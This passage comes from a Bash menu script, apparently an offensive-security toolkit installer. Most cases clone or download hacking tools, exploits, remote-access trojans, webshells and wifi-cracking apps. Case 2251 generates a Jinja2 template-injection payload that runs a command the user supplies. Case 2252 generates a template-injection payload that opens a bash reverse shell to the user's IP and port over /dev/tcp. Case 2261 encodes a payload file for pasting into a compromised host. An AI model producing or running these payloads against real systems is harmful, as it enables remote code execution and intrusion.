		Clona "nccgroup/ssh-user-enum"
	;;
	"1955")
		Scarica "$ENTRAW""phxbandit/scripts-and-tools/master/sshscan.py"
	;;
	"1956")
		Clona "pahaz/sshtunnel"
	;;
	"1957")
		Clona "sshuttle/sshuttle"
	;;
	"1958")
		Clona "zombiesam/ssl_phuck3r"
	;;
	"1959")
		Clona "grwl/sslcaudit"
	;;
	"1960")
		Clona "ssllabs/ssllabs-scan"
	;;
	"1961")
		Clona "jtripper/sslnuke"
	;;
	"1962")
		Clona "DinoTools/sslscan"
	;;
	"1963")
		Clona "nabla-c0d3/sslyze"
	;;
	"1964")
		Clona "secrary/SSMA"
	;;
	"1965")
		Clona "bcoles/ssrf_proxy"
	;;
	"1966")
		Clona "teknogeek/ssrf-sheriff"
	;;
	"1967")
		Clona "d4rkcat/stackflow"
	;;
	"1968")
		Clona "vincentcox/StaCoAn"
	;;
	"1969")
		Clona "j-t/staekka"
	;;
	"1970")
		Clona "0xPrateek/Stardox"
	;;
	"1971")
		Clona "ipopov/starttls-mitm"
	;;
	"1972")
		Clona "redNixon/stegdetect"
	;;
	"1973")
		Clona "razc411/StegoLeggo"
	;;
	"1974")
		Clona "epinna/Stegosip"
	;;
	"1975")
		Clona "bannsec/stegoVeritas"
	;;
	"1976")
		Clona "zardus/ctf-tools"
	;;
	"1977")
		Clona "google/stenographer"
	;;
	"1978")
		Clona "ztgrace/sticky_keys_hunter"
	;;
	"1979")
		Clona "PUNCH-Cyber/stoq"
	;;
	"1980")
		Clona "UltimateHackers/Striker"
	;;
	"1981")
		Clona "fireeye/stringsifter"
	;;
	"1982")
		Clona "TheRook/subbrute"
	;;
	"1983")
		Clona "projectdiscovery/subfinder"
	;;
	"1984")
		Clona "subjack/subjack"
	;;
	"1985")
		Clona "yassineaboukir/sublert"
	;;
	"1986")
		Clona "Ice3man543/SubOver"
	;;
	"1987")
		Clona "Subterfuge-Framework/Subterfuge"
	;;
	"1988")
		Clona "Anon-Exploiter/SUID3NUM"
	;;
	"1989")
		Clona "OpenRCE/sulley"
	;;
	"1990")
		Clona "OISF/suricata-verify"
	;;
	"1991")
		Clona "anantshri/svn-extractor"
	;;
	"1992")
		Clona "jakecreps/swamp"
	;;
	"1993")
		Clona "Arvin-X/swarm"
	;;
	"1994")
		Clona "MilindPurswani/Syborg"
	;;
	"1995")
		Clona "dlrobertson/sylkie"
	;;
	"1996")
		Clona "danigargu/syms2elf"
	;;
	"1997")
		Clona "securestate/syringe"
	;;
	"1998")
		Clona "ANSSI-FR/tabi"
	;;
	"1999")
		Clona "delvelabs/tachyon"
	;;
	"2000")
		Clona "0xdea/tactical-exploitation"
	;;
	"2001")
		Clona "enkomio/Taipan"
	;;
	"2002")
		Clona "m4ll0k/takeover"
	;;
	"2003")
		Clona "antagon/TCHunt-ng"
	;;
	"2004")
		Clona "Octosec/tckfc"
	;;
	"2005")
		Clona "session-replay-tools/tcpcopy"
	;;
	"2006")
		Clona "netik/tcpdstat"
	;;
	"2007")
		Clona "simsong/tcpflow"
	;;
	"2008")
		Clona "1aN0rmus/TekDefense-Automater"
	;;
	"2009")
		Clona "kavishgr/tempomail"
	;;
	"2010")
		Clona "drwetter/testssl.sh"
	;;
	"2011")
		Clona "cybersafeblr/thedorkbox"
	;;
	"2012")
		Clona "ytisf/theZoo"
	;;
	"2013")
		Clona "threatspec/threatspec"
	;;
	"2014")
		Clona "AeonDave/tilt"
	;;
	"2015")
		Clona "technoskald/tinfoleak"
	;;
	"2016")
		Clona "RUB-NDS/TLS-Attacker"
	;;
	"2017")
		Clona "LeeBrotherston/tls-fingerprinting"
	;;
	"2018")
		Clona "WestpointLtd/tls_prober"
	;;
	"2019")
		Clona "Ayrx/tlsenum"
	;;
	"2020")
		Clona "tomato42/tlsfuzzer"
	;;
	"2021")
		Clona "iSECPartners/tlspretense"
	;;
	"2022")
		Clona "dariusztytko/token-reverser"
	;;
	"2023")
		Clona "toperaproject/topera"
	;;
	"2024")
		Clona "Edu4rdSHL/tor-router"
	;;
	"2025")
		Clona "MikeMeliz/TorCrawl.py"
	;;
	"2026")
		Clona "BlackArch/torctl"
	;;
	"2027")
		Clona "epinna/tplmap"
	;;
	"2028")
		Clona "jofpin/trape"
	;;
	"2029")
		Clona "M4cs/traxss"
	;;
	"2030")
		Clona "GuerrillaWarfare/Treasure"
	;;
	"2031")
		Clona "JonathanSalwan/Triton"
	;;
	"2032")
		Clona "aquasecurity/trivy"
	;;
	"2033")
		Clona "nightwatchcybersecurity/truegaze"
	;;
	"2034")
		Clona "adoreste/truehunter"
	;;
	"2035")
		Clona "dxa4481/truffleHog"
	;;
	"2036")
		Clona "mandatoryprogrammer/TrustTrees"
	;;
	"2037")
		Clona "infodox/tsh-sctp"
	;;
	"2038")
		Clona "tp7309/TTPassGen"
	;;
	"2039")
		Clona "SECFORCE/Tunna"
	;;
	"2040")
		Clona "x0rz/tweets_analyzer"
	;;
	"2041")
		Clona "thelinuxchoice/tweetshell"
	;;
	"2042")
		Clona "twintproject/twint"
	;;
	"2043")
		Clona "whoot/Typo-Enumerator"
	;;
	"2044")
		Clona "nbulischeck/tyton"
	;;
	"2045")
		Clona "hfiref0x/UACME"
	;;
	"2046")
		Clona "ShutdownRepo/uberfile"
	;;
	"2047")
		Clona "headlesszeke/ubiquiti-probing"
	;;
	"2048")
		Clona "wangyu-/udp2raw-tunnel"
	;;
	"2049")
		Clona "Hello71/udpastcp"
	;;
	"2050")
		Clona "zombieCraig/UDSim"
	;;
	"2051")
		Clona "theopolis/uefi-firmware-parser"
	;;
	"2052")
		Clona "epsylon/ufonet"
	;;
	"2053")
		Clona "Raikia/UhOh365"
	;;
	"2054")
		Clona "harismuneer/Ultimate-Facebook-Scraper"
	;;
	"2055")
		Clona "nccgroup/umap"
	;;
	"2056")
		Clona "tomnomnom/unfurl"
	;;
	"2057")
		Clona "GDSSecurity/Unibrute"
	;;
	"2058")
		Clona "trustedsec/unicorn"
	;;
	"2059")
		Clona "rk700/uniFuzzer"
	;;
	"2060")
		Clona "pzread/unstrip"
	;;
	"2061")
		Clona "altf4/untwister"
	;;
	"2062")
		Clona "nccgroup/UPnP-Pentest-Toolkit"
	;;
	"2063")
		Clona "ferrery1/UpPwn"
	;;
	"2064")
		Clona "initstring/uptux"
	;;
	"2065")
		Clona "upx/upx"
	;;
	"2066")
		Clona "jopohl/urh"
	;;
	"2067")
		Clona "eschultze/URLextractor"
	;;
	"2068")
		Clona "errbufferoverfl/usb-canary"
	;;
	"2069")
		Clona "snovvcrash/usbrip"
	;;
	"2070")
		Clona "jseidl/usernamer"
	;;
	"2071")
		Clona "thelinuxchoice/userrecon"
	;;
	"2072")
		Clona "lucmski/userrecon-py"
	;;
	"2073")
		Clona "v3n0m-Scanner/V3n0M-Scanner"
	;;
	"2074")
		Clona "hahwul/vais"
	;;
	"2075")
		Clona "radare/valabind"
	;;
	"2076")
		Clona "NextronSystems/valhallaAPI"
	;;
	"2077")
		Clona "delvelabs/vane"
	;;
	"2078")
		Clona "abhisharma404/vault"
	;;
	"2079")
		Clona "MalwareCantFly/Vba2Graph"
	;;
	"2080")
		Clona "nccgroup/vbrute"
	;;
	"2081")
		Clona "rezasp/vbscan"
	;;
	"2082")
		Clona "melvinsh/vcsmap"
	;;
	"2083")
		Clona "subgraph/Vega"
	;;
	"2084")
		Clona "SerNet/verinice"
	;;
	"2085")
		Clona "codingo/VHostScan"
	;;
	"2086")
		Clona "botherder/viper"
	;;
	"2087")
		Clona "decalage2/ViperMonkey"
	;;
	"2088")
		Clona "botherder/virustotal"
	;;
	"2089")
		Clona "blackvkng/viSQL"
	;;
	"2090")
		Clona "keithjjones/visualize_logs"
	;;
	"2091")
		Clona "nccgroup/vlan-hopping"
	;;
	"2092")
		Clona "mempodippy/vlany"
	;;
	"2093")
		Clona "git-rep/vmap"
	;;
	"2094")
		Clona "jbremer/vmcloak"
	;;
	"2095")
		Clona "n0fate/volafox"
	;;
	"2096")
		Clona "volatilityfoundation/volatility"
	;;
	"2097")
		Clona "volatilityfoundation/community"
	;;
	"2098")
		Clona "0x36/VPNPivot"
	;;
	"2099")
		Clona "sanvil/vsaudit"
	;;
	"2100")
		Clona "pasjtene/Vscan"
	;;
	"2101")
		Clona "varunjammula/VSVBP"
	;;
	"2102")
		Clona "vulmon/Vulmap"
	;;
	"2103")
		Clona "muhammad-bouabid/Vulnerabilities-spider"
	;;
	"2104")
		Clona "anouarbensaad/vulnx"
	;;
	"2105")
		Clona "boy-hack/w13scan"
	;;
	"2106")
		Clona "andresriancho/w3af"
	;;
	"2107")
		Clona "wafpassproject/wafpass"
	;;
	"2108")
		Clona "SYWorks/waidps"
	;;
	"2109")
		Clona "red-team-labs/waldo"
	;;
	"2110")
		Clona "m4ll0k/WAScan"
	;;
	"2111")
		Clona "uoaerg/wavemon"
	;;
	"2112")
		Clona "jsvine/waybackpack"
	;;
	"2113")
		Clona "tomnomnom/waybackurls"
	;;
	"2114")
		Clona "endrazine/wcc"
	;;
	"2115")
		Clona "rverton/webanalyze"
	;;
	"2116")
		Clona "Matir/webborer"
	;;
	"2117")
		Clona "sarthakpandit/webenum"
	;;
	"2118")
		Clona "AutoSecTools/WebExploitationTool"
	;;
	"2119")
		Clona "takeshixx/webfixy"
	;;
	"2120")
		Clona "lnxg33k/webhandler"
	;;
	"2121")
		Clona "peedcorp/WebHunter"
	;;
	"2122")
		Clona "ultrasecurity/webkiller"
	;;
	"2123")
		Clona "zigoo0/webpwn3r"
	;;
	"2124")
		Clona "BlackArch/webrute"
	;;
	"2125")
		Clona "PentesterES/WebSearch"
	;;
	"2126")
		Clona "BlackArch/webshells"
	;;
	"2127")
		Clona "kanaka/websockify"
	;;
	"2128")
		Clona "websploit/websploit"
	;;
	"2129")
		Clona "xionsec/WebXploiter"
	;;
	"2130")
		Clona "WeebSec/weebdns"
	;;
	"2131")
		Clona "Hypsurus/weeman"
	;;
	"2132")
		Clona "carnal0wnage/weirdAAL"
	;;
	"2133")
		Clona "bitsadmin/wesng"
	;;
	"2134")
		Clona "xmendez/wfuzz"
	;;
	"2135")
		Clona "B16f00t/whapa"
	;;
	"2136")
		Clona "ekultek/whatbreach"
	;;
	"2137")
		Clona "ncrocfer/whatportis"
	;;
	"2138")
		Clona "WebBreacher/WhatsMyName"
	;;
	"2139")
		Clona "Ekultek/WhatWaf"
	;;
	"2140")
		Clona "Nitr4x/whichCDN"
	;;
	"2141")
		Clona "Ekultek/whitewidow"
	;;
	"2142")
		Clona "Mi-Al/WiFi-autopwner"
	;;
	"2143")
		Clona "DanMcInerney/wifi-monitor"
	;;
	"2144")
		Clona "P0cL4bs/wifipumpkin3"
	;;
	"2145")
		Clona "gentilkiwi/wifichannelmonitor"
	;;
	"2146")
		Clona "oblique/wificurse"
	;;
	"2147")
		Clona "DanMcInerney/wifijammer"
	;;
	"2148")
		Clona "mehdilauters/wifiScanMap"
	;;
	"2149")
		Clona "GDSSecurity/wifitap"
	;;
	"2150")
		Clona "derv82/wifite"
	;;
	"2151")
		Clona "jekyc/wig"
	;;
	"2152")
		Clona "zombiesam/wikigen"
	;;
	"2153")
		Clona "localh0t/wildpwn"
	;;
	"2154")
		Clona "basil00/Divert"
	;;
	"2155")
		Clona "BlackArch/windows-binaries"
	;;
	"2156")
		Clona "GDSSecurity/Windows-Exploit-Suggester"
	;;
	"2157")
		Clona "PoorBillionaire/Windows-Prefetch-Parser"
	;;
	"2158")
		Clona "pentestmonkey/windows-privesc-check"
	;;
	"2159")
		Clona "crazy-max/WindowsSpyBlocker"
	;;
	"2160")
		Clona "S3cur3Th1sSh1t/WinPwn"
	;;
	"2161")
		Clona "jbruchon/winregfs"
	;;
	"2162")
		Clona "SYWorks/wireless-ids"
	;;
	"2163")
		Clona "ThomasTJdev/WMD"
	;;
	"2164")
		Clona "davidpany/WMI_Forensics"
	;;
	"2165")
		Clona "Crapworks/wolpertinger"
	;;
	"2166")
		Clona "magnific0/wondershaper"
	;;
	"2167")
		Clona "BlackArch/wordlistctl"
	;;
	"2168")
		Clona "4n4nk3/Wordlister"
	;;
	"2169")
		Clona "gbrindisi/wordpot"
	;;
	"2170")
		Clona "rastating/wordpress-exploit-framework"
	;;
	"2171")
		Clona "SYWorks/wpa-bruteforcer"
	;;
	"2172")
		Clona "dxa4481/WPA2-HalfHandshake-Crack"
	;;
	"2173")
		Clona "dejanlevaja/wpbf"
	;;
	"2174")
		Clona "zendoctor/wpbrute-rpc"
	;;
	"2175")
		Clona "webarx-security/wpbullet"
	;;
	"2176")
		Clona "Tuhinshubhra/WPintel"
	;;
	"2177")
		Clona "0x90/wpsik"
	;;
	"2178")
		Clona "JamesJGoodwin/wreckuests"
	;;
	"2179")
		Clona "mrpapercut/wscript"
	;;
	"2180")
		Clona "nccgroup/wssip"
	;;
	"2181")
		Clona "ctxis/wsuspect-proxy"
	;;
	"2182")
		Clona "asciimoo/wuzz"
	;;
	"2183")
		Clona "X-Vector/X-RSA"
	;;
	"2184")
		Clona "x64dbg/x64dbg"
	;;
	"2185")
		Clona "orf/xcat"
	;;
	"2186")
		Clona "nccgroup/xcavator"
	;;
	"2187")
		Clona "mandatoryprogrammer/xcname"
	;;
	"2188")
		Clona "LionSec/xerosploit"
	;;
	"2189")
		Clona "earthquake/xfltreat"
	;;
	"2190")
		Clona "kavishgr/xmlrpc-bruteforcer"
	;;
	"2191")
		Clona "hellman/xortool"
	;;
	"2192")
		Clona "mandatoryprogrammer/xpire-crossdomain-scanner"
	;;
	"2193")
		Clona "CoderPirata/XPL-SEARCH"
	;;
	"2194")
		Clona "evilsocket/xray"
	;;
	"2195")
		Clona "acama/xrop"
	;;
	"2196")
		Clona "hacker900123/XSS-Freak"
	;;
	"2197")
		Clona "menkrep1337/XSSCon"
	;;
	"2198")
		Clona "DanMcInerney/xsscrapy"
	;;
	"2199")
		Clona "mandatoryprogrammer/xssless"
	;;
	"2200")
		Clona "gwroblew/detectXSSlib"
	;;
	"2201")
		Clona "1N3/XSSTracer"
	;;
	"2202")
		Clona "UltimateHackers/XSStrike"
	;;
	"2203")
		Clona "yehia-mamdouh/XSSYA"
	;;
	"2204")
		Clona "3xp10it/bypass_waf"
	;;
	"2205")
		Clona "enjoiz/XXEinjector"
	;;
	"2206")
		Clona "staaldraad/xxeserv"
	;;
	"2207")
		Clona "luisfontes19/xxexploiter"
	;;
	"2208")
		Clona "Plasticoo/YAAF"
	;;
	"2209")
		Clona "VirusTotal/yara"
	;;
	"2210")
		Clona "0xsauby/yasuo"
	;;
	"2211")
		Clona "adamcaudill/yawast"
	;;
	"2212")
		Clona "Jguer/yay"
	;;
	"2213")
		Clona "yeti-platform/yeti"
	;;
	"2214")
		Clona "frohoff/ysoserial"
	;;
	"2215")
		Clona "urbanesec/ZackAttack"
	;;
	"2216")
		Clona "zmap/zdns"
	;;
	"2217")
		Clona "zeek/zeek"
	;;
	"2218")
		Clona "zeek/zeek-aux"
	;;
	"2219")
		Clona "zeropointdynamics/zelos"
	;;
	"2220")
		Clona "ChrisTheCoolHut/Zeratool"
	;;
	"2221")
		Clona "DenizParlak/Zeus"
	;;
	"2222")
		Clona "Ekultek/Zeus-Scanner"
	;;
	"2223")
		Clona "zmap/zgrab"
	;;
	"2224")
		Clona "zmap/zgrab2"
	;;
	"2225")
		Clona "pasahitz/zirikatu"
	;;
	"2226")
		Clona "cyrus-and/zizzania"
	;;
	"2227")
		Clona "mhogomchungu/zuluCrypt"
	;;
	"2228")
		Clona "drsigned/sigurlx"
	;;
	"2229")
		Clona "htrgouvea/nipe"
	;;
	"2230")
		Clona "fadinglr/Parat"
	;;
	"2231")
		Clona "nccgroup/umap2"
	;;
	"2232")
		Clona "usb-tools/ViewSB"
	;;
	"2233")
		Clona "Merimetso-Code/USB-Hacking"
	;;
	"2234")
		ScaricaIn "$ENTSSL""OnionApps/Chat.onion/raw/master/app/app-release.apk" "Chat.onion.apk"
	;;
	"2235")
		Clona "BenChaliah/Arbitrium-RAT"
	;;
	"2236")
		Clona "six2dez/reconftw"
	;;
	"2237")
		Scarica "$ENTRAW""mm0r1/exploits/master/php-json-bypass/exploit.php"
	;;
	"2238")
		Scarica "$ENTRAW""mm0r1/exploits/master/php7-backtrace-bypass/exploit.php"
	;;
	"2239")
		Scarica "$ENTRAW""mm0r1/exploits/master/php7-gc-bypass/exploit.php"
	;;
	"2240")
		Clona "kpcyrd/sniffglue"
	;;
	"2241")
		Clona "master-of-servers/mose"
	;;
	"2242")
		Clona "poerschke/Uniscan"
	;;
	"2243")
		Clona "CoolHandSquid/TireFire"
	;;
	"2244")
		Clona "yassineaboukir/Asnlookup"
	;;
	"2245")
		Clona "kismetwireless/kismet"
	;;
	"2246")
		Scarica "$ENTRAW""souravbaghz/RadareEye/main/radare"
	;;
	"2247")
		Clona "ecriminal/phpvuln"
	;;
	"2248")
		Clona "ZaleHack/phpexploit"
	;;
	"2249")
		Scarica "$ENTSSL""deepsecurity-pe/GoGhost/raw/master/GoGhost_linux_amd64"
	;;
	"2250")
		Clona "its-a-feature/Mythic"
	;;
	"2251")
		echo "Digit a command for the RCE"
		read -p "(example, whoami): " CMD
		if [[ "$CMD" != "" ]];
		then
			echo "{{config.__class__.__init__.__globals__['os'].popen(\"""$CMD""\").read()}}"
		fi
	;;
	"2252")
		echo "Digit your IP"
		read -p "(example, 10.11.12.13): " MIP
		if [[ "$MIP" != "" ]];
		then
			echo "Digit your remote PORT"
			read -p "(example, 9001): " MPRT
			if [[ "$MPRT" =~ ^[0-9]+$ ]];
			then
				echo "{{config.__class__.__init__.__globals__['os'].popen(\"bash -c 'bash -i >& /dev/tcp/""$MIP""/""$MPRT"" 0>&1'\").read()}}"
			fi
		fi
	;;
	"2253")
		Clona "CompassSecurity/BloodHoundQueries"
	;;
	"2254")
		ScaricaIn "$ENTSSL""LinkClink/Rainbow-Wifi-Hack-Utility-Android/releases/download/1.0/Rainbow.Wifi.Hack.Utility.1.0.apk" "Rainbow.Wifi.Hack.Utility.1.0.apk"
	;;
	"2255")
		ScaricaIn "$ENTSSL""trevatk/Wifi-Cracker/raw/master/oldAPK/WifiCracker.apk" "WifiCrackerOld.apk"
	;;
	"2256")
		ScaricaIn "$ENTSSL""trevatk/Wifi-Cracker/raw/master/newAPK/app-debug.apk" "WifiCrackerNew.apk"
	;;
	"2257")
		ScaricaIn "$ENTSSL""faizann24/wifi-bruteforcer-fsecurify/raw/master/wifi_bruteforcer_fsecurify.apk" "wifi_bruteforcer_fsecurify.apk"
	;;
	"2258")
		ScaricaIn "$ENTSSL""faizann24/wifi-bruteforcer-fsecurify/raw/master/wifi_bruteforcer_fsecurify_6.0.apk" "wifi_bruteforcer_fsecurify_6.0.apk"
	;;
	"2259")
		Scarica "$ENTRAW""nitefood/asn/master/asn"
	;;
	"2260")
		Clona "cube0x0/HashSpray.py"
	;;
	"2261")
		echo "Digit a file to encrypt"
		read -e -p "(example, ./payload): " FL
		if [[ -f "$FL" ]];
		then
			echo "Digit a new file name"
			read -e -p "(example, payload.enc): " ENFL
			if [[ "$ENFL" != "" ]];
			then
				zip -e "$ENFL" "$FL"
				echo "PASTE this in linuxallenum"
				echo "or decode with base64 then unzip"
				MIO=$(base64 "$ENFL" -w 0)
				echo "$MIO"
				echo "$MIO" | xclip -selection clipboard
			fi
		fi
	;;
	"2262")
		Scarica "$ENTRAW""darrenmartyn/VisualDoor/main/visualdoor.py"
	;;
	"2263")
		Clona "luc10/zykgen"
	;;
	"2264")
		Scarica "$ENTRAW""dhishan/UPnP-Hack/master/upnpdiscover.py"
	;;
	"2265")
		Clona "tlsfuzzer/tlsfuzzer"
	;;
	"2266")
		Clona "presidentbeef/brakeman"
	;;
	"2267")
		select PIPO in "0trace" "3proxy" "3proxy-win32" "42zip" "ace" "admid-pack" "afflib" "afpfs-ng" "against" "aiengine" "aimage" "air" "airgraph-ng" "american-fuzzy-lop" "androguard" "android-apktool" "android-ndk" "android-sdk-platform-tools" "android-sdk" "android-udev-rules" "arachni" "arduino" "argus" "argus-clients" "armitage" "arp-scan" "artillery" "asp-audit" "athena-ssl-scanner" "auto-xor-decryptor" "autopsy" "azazel" "b2sum" "backdoor-factory" "balbuzard" "bamf-framework" "batman-adv" "bbqsql" "bbrecon" "bed" "beef" "beholder" "bgp-md5crack" "bing-ip2hosts" "bing-lfi-rfi" "binwalk" "bios_memimage" "blackarch-menus" "bletchley" "bluebox-ng" "bluelog" "blueprint" "bmap-tools" "bob-the-butcher" "braa" "braces" "browser-fuzzer" "brutus" "bsdiff" "bss" "bt_audit" "bulk-extractor" "bully" "bunny" "burpsuite" "bvi" "cadaver" "canari" "capstone" "casefile" "centry" "cewl" "cflow" "check-weak-dh-ssh" "checkpwd" "checksec" "chiron" "chownat" "chrome-decode" "cidr2range" "ciphertest" "cirt-fuzzer" "cisco-auditing-tool" "cisco-global-exploiter" "cisco-ocs" "cisco-router-config" "cisco-scanner" "cisco-torch" "cisco5crack" "cisco7crack" "ciscos" "climber" "cloudsplaining" "clusterd" "cms-explorer" "cms-few" "codetective" "complemento" "conpot" "cookie-cadger" "cppcheck" "cpptest" "crackle" "create-ap" "creds" "creepy" "crunch" "cuckoo" "cupp" "cutycapt" "darkd0rk3r" "dbd" "dc3dd" "ddrescue" "device-pharmer" "dex2jar" "dff-scanner" "dhcpig" "dirb" "dirbuster" "dirs3arch" "dislocker" "dissector" "dizzy" "dmitry" "dns-spoof" "dns2geoip" "dns2tcp" "dnsa" "dnschef" "dnsmap" "dnsrecon" "dnsutils" "domain-analyzer" "dradis" "dripper" "dsd" "dsniff" "dumb0" "dump1090" "eapmd5pass" "easy-creds" "eazy" "edb" "eindeutig" "elettra" "elettra-gui" "elite-proxy-finder" "enabler" "ent" "enum-shares" "enum4linux" "erase-registrations" "ettercap" "exiv2" "exploit-db" "eyewitness" "facebot" "fakeap" "fakedns" "fakemail" "fang" "fern-wifi-cracker" "fierce" "fiked" "filibuster" "fimap" "findmyhash" "firmware-mod-kit" "fl0p" "flare" "flasm" "flawfinder" "flunym0us" "foremost" "fping" "fport" "fraud-bridge" "freeipmi" "freeradius" "fs-nyarl" "ftp-fuzz" "ftp-scanner" "ftp-spider" "fusil" "fuzzdb" "g72x++" "galleta" "gdb" "geoip" "ghost-phisher" "ghost-py" "gnuradio" "gnutls2" "goldeneye" "golismero" "goog-mail" "gqrx" "grabber" "gtalk-decode" "gtp-scan" "hackersh" "halberd" "halcyon" "hamster" "handle" "hasere" "hash-identifier" "hashcat" "hashcat-utils" "hasher" "hashid" "hashpump" "hashtag" "haystack" "hdcp-genkey" "hdmi-sniff" "heartbleed-honeypot" "hex2bin" "honeyd" "honssh" "host-extract" "hostbox-ssh" "hotpatch" "hotspotter" "hpfeeds" "hping" "http-enum" "http-fuzz" "http-put" "http-traceroute" "httpforge" "httping" "httprint-win32" "hulk" "hwk" "hydra" "hyenae" "hyperion" "ike-scan" "imagejs" "inception" "intercepter-ng" "interrogate" "intersect" "inundator" "iodine" "ip-https-tools" "iputils" "ipv6toolkit" "isr-form" "jad" "jboss-autopwn" "jd-gui" "jhead" "jigsaw" "john" "johnny" "joomscan" "js-beautify" "jsql" "junkie" "jynx2" "kalibrate-rtl" "kippo" "kismet" "kismet-earth" "kismet2earth" "klogger" "kolkata" "kraken" "laf" "lans" "latd" "lbd" "leo" "leroy-jenkins" "lfi-autopwn" "lfi-exploiter" "lfi-fuzzploit" "lfi-scanner" "lfi-sploiter" "lft" "liffy" "linenum" "linux-exploit-suggester" "list-urls" "logkeys" "loki" "lynis" "mac-robber" "macchanger" "maclookup" "magictree" "make-pdf" "malheur" "maligno" "maltego" "maltrieve" "malware-check-tool" "marc4dasm" "maskprocessor" "masscan" "mat" "md5deep" "mdbtools" "mdk3" "mdns-scan" "medusa" "melkor" "memdump" "metasploit" "miranda-upnp" "missionplanner" "mitmproxy" "mkbrutus" "moloch" "monocle" "mp3nema" "mptcp" "mptcp-abuse" "ms-sys" "mtr" "mutator" "mysql2sqlite" "nbtool" "ncrack" "nemesis" "netbios-share-scanner" "netcon" "netdiscover" "netmap" "netmask" "netscan" "netsniff-ng" "netzob" "ngrep" "nield" "nikto" "nipper" "nmap" "nsec3walker" "ntds-decode" "o-saft" "oat" "obfsproxy" "objection" "oclhashcat" "ocs" "ollydbg" "onesixtyone" "onionsearch" "onionshare" "openvas-cli" "openvas-libraries" "openvas-manager" "openvas-scanner" "origami" "ostinato" "owasp-bywaf" "owtf" "p0f" "pack" "packet-o-matic" "packeth" "packit" "padbuster" "panoptic" "paros" "parsero" "pasco" "passe-partout" "passivedns" "patator" "pathod" "pcredz" "pdf-parser" "pdfbook-analyzer" "pdfid" "pdfresurrect" "peach" "peda" "peepdf" "perl-image-exiftool" "perl-tftp" "pev" "php-mt-seed" "php-rfi-payload-decoder" "php-vulnerability-hunter" "plecost" "pompem" "posttester" "powersploit" "prometheus" "protos-sip" "proxychains-ng" "proxycheck" "proxyp" "proxytunnel" "pscan" "pshitt" "pwd-hash" "pwn" "pwntools" "py2exe" "pyew" "pyinstaller" "pyrasite" "pyrit" "python-utidylib" "python2-binaryornot" "python2-yara" "radamsa" "radare2" "radiography" "rarcrack" "rawr" "rcracki-mt" "rdesktop-brute" "reaver" "rebind" "recon-ng" "regeorg" "relay-scanner" "responder" "rfcat" "rfidiot" "rkhunter" "rlogin-scanner" "ropgadget" "ropper" "rrs" "rtlsdr-scanner" "rtp-flood" "ruby-msgpack" "ruby-ronin" "ruby-ronin-support" "ruby-uri-query_params" "rww-attack" "safecopy" "sakis3g" "sandy" "sasm" "sb0x" "sbd" "scalpel" "scanmem" "scapy" "schnappi-dhcp" "scout2" "scrapy" "scrounge-ntfs" "seat" "secure-delete" "sees" "sergio-proxy" "sessionlist" "set" "shellme" "siege" "silk" "simple-ducky" "simple-lan-scan" "sinfp" "sipp" "sipvicious" "skipfish" "skype-dump" "sleuthkit" "slowloris" "smali" "smartphone-pentest-framework" "smbexec" "smtp-fuzz" "smtp-user-enum" "smtp-vrfy" "sn00p" "snmp-fuzzer" "snoopy-ng" "snort" "snow" "socat" "soot" "spade" "spectools" "spiderfoot" "spiderpig-pdffuzzer" "spike" "spike-proxy" "splint" "sploitego" "sps" "sqid" "sqlmap" "sqlninja" "ssh-privkey-crack" "sshuttle" "ssl-hostname-resolver" "ssl-phuck3r" "ssldump" "sslh" "sslscan" "sslstrip" "sslyze" "starttls-mitm" "steghide" "stompy" "storm-ring" "stunnel" "subdomainer" "sulley" "suricata" "svn-extractor" "swaks" "synflood" "synscan" "sysdig" "sysinternals-suite" "t50" "tbear" "tcpcontrol-fuzzer" "tcpdump" "tcpextract" "tcpflow" "tcpreplay" "tcpwatch" "teardown" "tekdefense-automater" "termineter" "tftp-bruteforce" "tftp-fuzz" "tftp-proxy" "thc-ipv6" "thc-keyfinder" "thc-pptp-bruter" "thc-smartbrute" "thc-ssl-dos" "theharvester" "tiger" "tilt" "tinc" "tinyproxy" "tlsenum" "tor" "tor-autocircuit" "tor-browser-en" "torshammer" "torsocks" "traceroute" "trid" "trinity" "trixd00r" "truecrypt" "tsh" "tsh-sctp" "twofi" "u3-pwn" "ubertooth" "udis86" "uefi-firmware-parser" "ufo-wardriving" "umap" "umit" "unhide" "unicorn" "unicornscan" "unix-privesc-check" "unsecure" "upx" "username-anarchy" "usernamer" "uw-loveimap" "uw-offish" "uw-udpscan" "uw-zone" "v3n0m" "valgrind" "vanguard" "vega" "veil" "viper" "vivisect" "vnc-bypauth" "volatility" "w3af" "wapiti" "web-soul" "webhandler" "webpwn3r" "webshells" "websockify" "webspa" "websploit" "weevely" "wfuzz" "whatweb" "wi-feye" "wifi-honey" "wifi-monitor" "wifiphisher" "wig" "wikigen" "winexe" "winfo" "wireless-ids" "wireshark-cli" "wireshark-gtk" "wlan2eth" "wmat" "wol-e" "wpscan" "ws-attacker" "x-scan" "xcavator" "xf86-video-qxl-git" "xortool" "xsser" "xsss" "yara" "ycrawler" "yersinia" "zaproxy" "zmap" "zulu" "zzuf"
		do
			if [[ "$PIPO" != "" ]];
			then
				pip install "$PIPO"
			else
				break
			fi
		done
	;;
	"2268")
		select PIPO in "0trace" "3proxy" "3proxy-win32" "42zip" "ace" "admid-pack" "afflib" "afpfs-ng" "against" "aiengine" "aimage" "air" "airgraph-ng" "american-fuzzy-lop" "androguard" "android-apktool" "android-ndk" "android-sdk-platform-tools" "android-sdk" "android-udev-rules" "arachni" "arduino" "argus" "argus-clients" "armitage" "arp-scan" "artillery" "asp-audit" "athena-ssl-scanner" "auto-xor-decryptor" "autopsy" "azazel" "b2sum" "backdoor-factory" "balbuzard" "bamf-framework" "batman-adv" "bbqsql" "bbrecon" "bed" "beef" "beholder" "bgp-md5crack" "bing-ip2hosts" "bing-lfi-rfi" "binwalk" "bios_memimage" "blackarch-menus" "bletchley" "bluebox-ng" "bluelog" "blueprint" "bmap-tools" "bob-the-butcher" "braa" "braces" "browser-fuzzer" "brutus" "bsdiff" "bss" "bt_audit" "bulk-extractor" "bully" "bunny" "burpsuite" "bvi" "cadaver" "canari" "capstone" "casefile" "centry" "cewl" "cflow" "check-weak-dh-ssh" "checkpwd" "checksec" "chiron" "chownat" "chrome-decode" "cidr2range" "ciphertest" "cirt-fuzzer" "cisco-auditing-tool" "cisco-global-exploiter" "cisco-ocs" "cisco-router-config" "cisco-scanner" "cisco-torch" "cisco5crack" "cisco7crack" "ciscos" "climber" "cloudsplaining" "clusterd" "cms-explorer" "cms-few" "codetective" "complemento" "conpot" "cookie-cadger" "cppcheck" "cpptest" "crackle" "create-ap" "creds" "creepy" "crunch" "cuckoo" "cupp" "cutycapt" "darkd0rk3r" "dbd" "dc3dd" "ddrescue" "device-pharmer" "dex2jar" "dff-scanner" 